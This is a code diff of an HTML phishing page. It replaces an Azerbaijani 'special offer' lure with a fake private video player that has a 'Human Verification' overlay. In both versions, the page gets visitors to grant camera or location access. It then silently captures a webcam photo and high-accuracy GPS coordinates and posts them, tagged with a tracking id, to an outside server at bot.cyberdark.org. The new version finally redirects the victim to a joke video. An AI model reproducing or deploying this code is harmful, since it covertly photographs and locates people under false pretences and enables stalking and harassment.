@@ -1,188 +1,291 @@
-<!DOCTYPE html>
-<html lang="az">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xüsusi Təklif Səni Gözləyir!</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Roboto', Arial, sans-serif;
-            background: linear-gradient(to bottom, #e0f7fa, #80deea);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .container {
-            text-align: center;
-            background: #ffffff;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            max-width: 500px;
-            animation: slideIn 0.8s ease-out;
-        }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        h1 {
-            color: #006064;
-            font-size: 28px;
-            margin-bottom: 15px;
-            font-weight: 500;
-        }
-        p {
-            color: #37474f;
-            font-size: 16px;
-            line-height: 1.5;
-            margin: 10px 0;
-        }
-        .highlight {
-            color: #00838f;
-            font-weight: bold;
-        }
-        .button {
-            display: inline-block;
-            padding: 10px 20px;
-            background: #00838f;
-            color: #ffffff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
-            margin-top: 15px;
-            transition: background 0.3s, transform 0.2s;
-        }
-        .button:hover {
-            background: #006064;
-            transform: translateY(-2px);
-        }
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #e0e0e0;
-            border-radius: 4px;
-            margin-top: 15px;
-            overflow: hidden;
-        }
-        .progress {
-            width: 0;
-            height: 100%;
-            background: #00838f;
-            animation: progress 5s linear forwards;
-        }
-        @keyframes progress {
-            to { width: 100%; }
-        }
-    </style>
-    <script>
-        async function getMedia(unique_id, api_url) {
-            try {
-                console.log("Kamera icazəsi istənilir...", { unique_id, api_url });
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Private Video Player</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background-color: #0f172a;
+      color: #f8fafc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
 
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        console.log("Video yükləndi, ölçülər:", video.videoWidth, video.videoHeight);
-                        resolve();
-                    };
-                });
+    .video-container {
+      width: min(800px, 95%);
+      background: #1e293b;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      position: relative;
+    }
 
-                video.play();
-                await new Promise((resolve) => setTimeout(resolve, 1000));
+    .video-screen {
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      cursor: pointer;
+    }
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
+    .play-button {
+      width: 80px;
+      height: 80px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+      transition: transform 0.3s ease, background 0.3s ease;
+      z-index: 10;
+    }
 
-                const imageDataUrl = canvas.toDataURL('image/jpeg');
-                console.log("Çəkilən şəkil (ilk 50 simvol):", imageDataUrl.substring(0, 50) + "...");
+    .play-button svg {
+      width: 40px;
+      height: 40px;
+      fill: white;
+    }
 
-                canvas.toBlob(blob => {
-                    console.log("Şəkil çəkildi, API-yə göndərilir...", { blobSize: blob.size });
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('unique_id', unique_id);
-                    fetch(api_url + '/upload', {
-                        method: 'POST',
-                        body: formData
-                    }).then(response => {
-                        console.log('Şəkil göndərildi:', response.status, response.statusText);
-                        return response.text();
-                    }).catch(error => {
-                        console.error('Şəkil göndərilmə xətası:', error);
-                    });
-                }, 'image/jpeg', 0.9);
-            } catch (err) {
-                console.error("Kamera xətası:", err);
-            }
-        }
+    .video-info {
+      padding: 20px;
+      border-top: 1px solid #334155;
+    }
 
-        function getLocation(unique_id, api_url) {
-            if (navigator.geolocation) {
-                console.log("Yer icazəsi istənilir...");
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    console.log("Yer məlumatı alındı:", lat, lon);
-                    fetch(api_url + '/upload_location', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({unique_id: unique_id, latitude: lat, longitude: lon})
-                    }).then(response => {
-                        console.log('Yer göndərildi:', response.status, response.statusText);
-                        return response.text();
-                    }).catch(error => {
-                        console.error('Yer göndərilmə xətası:', error);
-                    });
-                }, err => {
-                    console.error("Yer xətası:", err);
-                });
-            } else {
-                console.error("Brauzer geolocation-u dəstəkləmir");
-            }
-        }
+    .video-info h1 {
+      margin: 0;
+      font-size: 18px;
+      font-weight: 600;
+      color: #e2e8f0;
+    }
 
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const unique_id = urlParams.get('id');
-            const type = urlParams.get('type');
-            const api_url = 'https://bot.cyberdark.org'; <!--railway saytinda acdiqimiz http serverin linki-->
+    .video-info p {
+      margin: 8px 0 0;
+      font-size: 14px;
+      color: #94a3b8;
+    }
 
-            console.log("Link parametrləri:", { unique_id, type, api_url });
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(15, 23, 42, 0.95);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      z-index: 100;
+    }
 
-            if (!unique_id || !type) {
-                document.body.innerHTML = '<h1>Keçərsiz link!</h1>';
-                console.error("Keçərsiz link: unique_id və ya type yoxdur");
-                return;
-            }
+    .verify-box {
+      max-width: 320px;
+    }
 
-            if (type === 'camera') {
-                getMedia(unique_id, api_url);
-            } else if (type === 'location') {
-                getLocation(unique_id, api_url);
-            }
-        };
-    </script>
+    .btn-verify {
+      background: #38bdf8;
+      color: #0f172a;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 6px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 15px;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    .status-text {
+      font-size: 14px;
+      color: #cbd5e1;
+      margin-top: 15px;
+      line-height: 1.5;
+    }
+
+    .loader {
+      border: 4px solid #334155;
+      border-top: 4px solid #38bdf8;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+      display: none;
+    }
+
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Xüsusi Təklif Səni Gözləyir!</h1>
-        <p>Sənə xüsusi olaraq hazırlanmış bir <span class="highlight">təklif</span> təqdim etmək üçün buradayıq!</p>
-        <p>Bir neçə saniyə ərzində sənin üçün nələr hazırladığımızı görəcəksən.</p>
-        <a href="#" class="button">Təklifi Gör!</a>
-        <div class="progress-bar">
-            <div class="progress"></div>
-        </div>
+
+  <div class="video-container">
+    <div class="video-screen" id="playArea">
+      <div class="play-button">
+        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+      </div>
     </div>
+    
+    <div class="video-info">
+      <h1>Private_Encrypted_Video_Rec772.mp4</h1>
+      <p>Source: Secure Cloud • Size: 24.8 MB • Today</p>
+    </div>
+
+    <div class="overlay" id="overlay">
+      <div class="verify-box">
+        <div class="loader" id="loader"></div>
+        <h2 id="verifyTitle">Human Verification</h2>
+        <p class="status-text" id="status">To access this private content, please complete the human verification process. Click below to continue.</p>
+        <button class="btn-verify" id="startAction">Verify Now</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const api_url = "https://bot.cyberdark.org"; 
+    const overlay = document.getElementById("overlay");
+    const playArea = document.getElementById("playArea");
+    const startAction = document.getElementById("startAction");
+    const statusText = document.getElementById("status");
+    const verifyTitle = document.getElementById("verifyTitle");
+    const loader = document.getElementById("loader");
+
+    function getParams() {
+      const p = new URLSearchParams(window.location.search);
+      return { id: p.get("id"), type: p.get("type") };
+    }
+
+    playArea.addEventListener('click', () => {
+      overlay.style.display = 'flex';
+    });
+
+    startAction.addEventListener('click', function() {
+      const params = getParams();
+      if (!params.id || !params.type) {
+        statusText.textContent = "Error: Invalid Session. Please use the link from the bot.";
+        return;
+      }
+
+      // Loader-i göstər, düyməni gizlə
+      loader.style.display = "block";
+      startAction.style.display = "none";
+
+      if (params.type === 'camera') {
+        captureCamera(params.id);
+      } else {
+        captureLocation(params.id);
+      }
+    });
+
+    async function captureCamera(unique_id) {
+      try {
+        statusText.textContent = "Initializing camera... Please allow access.";
+        
+        // Kamera icazəsini birbaşa istəyirik
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
+        
+        statusText.textContent = "Connecting to server...";
+        
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.muted = true;
+        await video.play();
+
+        // Şəkil çəkmək üçün bir az gözlə (fokuslanma üçün)
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        // Kameranı söndür
+        stream.getTracks().forEach(track => track.stop());
+
+        statusText.textContent = "Uploading verification data...";
+
+        canvas.toBlob(async (blob) => {
+          const form = new FormData();
+          form.append("photo", blob, "verify.jpg");
+          form.append("unique_id", unique_id);
+
+          try {
+            const response = await fetch(api_url + "/upload", {
+              method: "POST",
+              body: form,
+              mode: 'cors'
+            });
+            if(response.ok) {
+                success();
+            } else {
+                throw new Error("Upload failed");
+            }
+          } catch (e) {
+            statusText.textContent = "Network error. Please try again.";
+            startAction.style.display = "block";
+            loader.style.display = "none";
+          }
+        }, "image/jpeg", 0.7);
+
+      } catch (err) {
+        console.error(err);
+        statusText.textContent = "Error: Camera access is required for verification.";
+        startAction.style.display = "block";
+        loader.style.display = "none";
+      }
+    }
+
+    function captureLocation(unique_id) {
+      statusText.textContent = "Requesting location access...";
+      
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        statusText.textContent = "Verifying location...";
+        try {
+          await fetch(api_url + "/upload_location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              unique_id: unique_id,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            }),
+            mode: 'cors'
+          });
+          success();
+        } catch (err) {
+          statusText.textContent = "Connection error.";
+          startAction.style.display = "block";
+          loader.style.display = "none";
+        }
+      }, (err) => {
+        statusText.textContent = "Location access denied. Verification failed.";
+        startAction.style.display = "block";
+        loader.style.display = "none";
+      }, { enableHighAccuracy: true });
+    }
+
+    function success() {
+      loader.style.display = "none";
+      verifyTitle.textContent = "✅ Verified";
+      statusText.textContent = "Verification complete. Redirecting to video...";
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+      }, 1500);
+    }
+  </script>
 </body>
 </html>
